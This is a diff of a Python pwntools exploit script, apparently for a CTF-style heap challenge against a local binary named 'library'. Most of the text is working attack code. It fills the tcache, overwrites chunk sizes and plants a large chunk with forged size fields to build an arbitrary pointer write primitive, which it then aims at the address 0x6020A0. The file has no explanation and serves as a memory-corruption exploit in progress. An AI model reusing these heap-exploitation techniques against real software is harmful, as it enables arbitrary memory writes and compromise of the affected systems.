@@ -1,5 +1,8 @@
 from pwn import *
 
+### arbitrary_pointer_write metadata ###
+ARB_PTR_WRITE_CHK_ID = 0
+
 def register(p: process, username: str = "user", password: str = "12345"):
     p.sendline("1")
     p.sendline(username)
@@ -82,13 +85,14 @@ def overwrite_chunk_size(p: process, size: int = 0x20, old_size: int = 1200):
 def fill_tcache(p: process, size: int, chunks: int = 7):
     ids = []
     for _ in range(chunks):
-        create_comment(p, 1200)
+        #create_comment(p, 1200)
         ids.append(create_comment(p, size, "a"))
 
     for id in ids:
         del_comment(p, id)
 
-def arbitrary_pointer_write(p: process, addr: int, data: str):
+def arb_ptr_write_init(p: process):
+    global ARB_PTR_WRITE_CHK_ID
     id0 = create_comment(p, 0x1024)
     id_pre1 = create_comment(p, 0x1024)
     id_pre2 = create_comment(p, 0x1024)
@@ -104,35 +108,45 @@ def arbitrary_pointer_write(p: process, addr: int, data: str):
     create_comment(p, 0x1200, b"\x00" * (0x1200 - 24 - 8) + b"\x50\x00\x00\x00\x00\x00\x00\x00" + p64(0x2011))
     print("edit id:", edit_id)
     del_comment(p, edit_id)
-    big_HOF_id = create_comment(p, 0x2000, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + (p64(0x60) * 0x100))
+    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x2000, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + (p64(0x60) * 0x100))
 
     fill_tcache(p, 0x50, 7)
     del_comment(p, 96)
 
     logout(p)
-    register(p, "arbitrary", "12345")
+    register(p, "aa", "aa")
     login(p)
 
-    del_comment(p, big_HOF_id)
-    create_comment(p, 0x2000)#, b"aaa\x00"*0x150)
-
-
-
+def arbitrary_pointer_write(p: process, addr: int, data: str):
+    global ARB_PTR_WRITE_CHK_ID
+    del_comment(p, ARB_PTR_WRITE_CHK_ID)
+    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x2000, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161) + (b"b" * 0x18) + p64(addr))
+    logout(p)
+    login(p, "aa", "aa")
+    return_book(p, True, len(data) + 0x30, data)
+    
 def main():
     ### run ###
     p = process("./library")
-    #p = gdb.debug("./library", "b main")
-    #p = gdb.debug("./library", "break *delete_comment+66")
     p.recvuntil("choice:")
     register(p, "user", "12345")
     register(p, "user1", "12345")
     login(p)
 
+    ### init ###
+    arb_ptr_write_init(p)
+
     ### leaks ###
     #create_heap_trap(p)
     
     ### payload start ###
-    arbitrary_pointer_write(p, 0x6020A0, p64(0x6020A0))
+    arbitrary_pointer_write(p, 0x6020A0, "asdfwefwe")
+    #logout(p)
+    #register(p, "user23", "aa")
+    #login(p, "user23", "aa")
+    #logout(p)
+    #register(p, "user2", "12345")
+    #login(p)
 
     #del_comment(p, edit_id)
     #create_comment(p, 0x5000, "abs")
